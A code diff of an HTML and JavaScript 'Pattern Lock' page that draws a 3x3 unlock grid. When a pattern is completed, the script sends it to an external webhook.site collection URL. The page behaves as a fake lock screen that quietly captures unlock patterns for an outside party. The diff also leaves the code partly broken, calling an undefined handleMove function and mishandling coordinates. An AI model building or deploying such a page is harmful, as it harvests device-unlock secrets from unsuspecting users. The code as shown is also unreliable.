@@ -1,3 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pattern Lock</title>
+
+  <style>
+    body {
+      margin: 0;
+  background: #111;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+    }
+
+    .wrapper {
+      position: relative;
+    }
+
+    canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+    }
+
+  
+.grid {
+  display: grid;
+  grid-template-columns: repeat(3, 22vw);
+
+  /* ⭐ separate control */
+  column-gap: 10vw;   /* left-right spacing */
+  row-gap: 16vh;      /* top-bottom spacing (THIS fixes height) */
+
+  justify-content: center;
+  align-items: center;
+  touch-action: none;
+}
+
+.dot {
+  width: 5vw;
+  height: 5vw;
+  background: #888;
+  border-radius: 50%;
+  margin: auto;
+}
+
+.dot.active {
+  background: #4CAF50;
+  transform: scale(1.8);
+}
+  </style>
+</head>
+
+<body>
+
+<div class="wrapper">
+  <canvas id="canvas"></canvas>
+
+  <div class="grid" id="grid">
+    <div class="dot" data-id="1"></div>
+    <div class="dot" data-id="2"></div>
+    <div class="dot" data-id="3"></div>
+    <div class="dot" data-id="4"></div>
+    <div class="dot" data-id="5"></div>
+    <div class="dot" data-id="6"></div>
+    <div class="dot" data-id="7"></div>
+    <div class="dot" data-id="8"></div>
+    <div class="dot" data-id="9"></div>
+  </div>
+</div>
+
 <script>
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
@@ -8,23 +81,16 @@ let pattern = [];
 let isDrawing = false;
 let currentPos = null;
 
-// ✅ Fix canvas scaling (IMPORTANT)
+// Resize canvas to grid
 function resizeCanvas() {
   const rect = grid.getBoundingClientRect();
-  const dpr = window.devicePixelRatio || 1;
-
-  canvas.width = rect.width * dpr;
-  canvas.height = rect.height * dpr;
-
-  canvas.style.width = rect.width + "px";
-  canvas.style.height = rect.height + "px";
-
-  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  canvas.width = rect.width;
+  canvas.height = rect.height;
 }
 resizeCanvas();
 window.addEventListener("resize", resizeCanvas);
 
-// ✅ Get dot center (correct)
+// Get dot center relative to grid
 function getCenter(dot) {
   const gridRect = grid.getBoundingClientRect();
   const rect = dot.getBoundingClientRect();
@@ -35,51 +101,35 @@ function getCenter(dot) {
   };
 }
 
-// ✅ Convert pointer to grid coordinates
-function getPoint(e) {
-  const gridRect = grid.getBoundingClientRect();
-
-  return {
-    x: e.clientX - gridRect.left,
-    y: e.clientY - gridRect.top,
-    clientX: e.clientX,
-    clientY: e.clientY
-  };
-}
-
-// ✅ Draw loop (smooth)
+// Draw lines + trailing finger line
 function draw() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-  if (pattern.length > 0) {
-    ctx.strokeStyle = "#4CAF50";
-    ctx.lineWidth = 6;
-    ctx.lineCap = "round";
-    ctx.lineJoin = "round";
+  if (pattern.length === 0) return;
 
-    ctx.beginPath();
+  ctx.strokeStyle = "#4CAF50";
+  ctx.lineWidth = 8;
+  ctx.lineCap = "round";
 
-    pattern.forEach((id, i) => {
-      const dot = document.querySelector(`[data-id='${id}']`);
-      const pos = getCenter(dot);
+  ctx.beginPath();
 
-      if (i === 0) ctx.moveTo(pos.x, pos.y);
-      else ctx.lineTo(pos.x, pos.y);
-    });
+  pattern.forEach((id, i) => {
+    const dot = document.querySelector(`[data-id='${id}']`);
+    const pos = getCenter(dot);
 
-    // ✅ trailing finger line
-    if (currentPos) {
-      ctx.lineTo(currentPos.x, currentPos.y);
-    }
+    if (i === 0) ctx.moveTo(pos.x, pos.y);
+    else ctx.lineTo(pos.x, pos.y);
+  });
 
-    ctx.stroke();
+  // ⭐ trailing line (finger follow)
+  if (currentPos) {
+    ctx.lineTo(currentPos.x, currentPos.y);
   }
 
-  requestAnimationFrame(draw); // smooth animation
+  ctx.stroke();
 }
-draw();
 
-// ✅ Activate dot
+// Activate dot
 function activate(dot) {
   const id = dot.dataset.id;
 
@@ -89,24 +139,20 @@ function activate(dot) {
   }
 }
 
-// ✅ Start drawing
+// Handle touch/mouse start
 function start(e) {
   e.preventDefault();
   isDrawing = true;
   pattern = [];
 
   const point = getPoint(e);
-  currentPos = point;
-
-  const el = document.elementFromPoint(point.clientX, point.clientY);
-  if (el && el.classList.contains("dot")) {
-    activate(el);
-  }
+  handleMove(point);
 }
 
-// ✅ Move
+// Handle move
 function move(e) {
   if (!isDrawing) return;
+  e.preventDefault();
 
   const point = getPoint(e);
   currentPos = point;
@@ -115,9 +161,11 @@ function move(e) {
   if (el && el.classList.contains("dot")) {
     activate(el);
   }
+
+  draw();
 }
 
-// ✅ End drawing
+// End drawing
 function end() {
   if (!isDrawing) return;
   isDrawing = false;
@@ -125,7 +173,7 @@ function end() {
   const result = pattern.join("-");
   alert("Pattern: " + result);
 
-  // webhook
+  // send webhook
   fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b", {
     method: "POST",
     mode: "no-cors",
@@ -136,12 +184,29 @@ function end() {
   setTimeout(() => {
     pattern = [];
     currentPos = null;
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
     dots.forEach(d => d.classList.remove("active"));
   }, 800);
 }
 
-// ✅ Events
-document.addEventListener("pointerdown", start);
-document.addEventListener("pointermove", move);
-document.addEventListener("pointerup", end);
+// Get touch/mouse point
+function getPoint(e) {
+  if (e.touches) return e.touches[0];
+  return e;
+}
+
+// Attach events
+dots.forEach(dot => {
+  dot.addEventListener("mousedown", start);
+  dot.addEventListener("touchstart", start);
+});
+
+document.addEventListener("mousemove", move);
+document.addEventListener("touchmove", move);
+
+document.addEventListener("mouseup", end);
+document.addEventListener("touchend", end);
 </script>
+
+</body>
+</html>
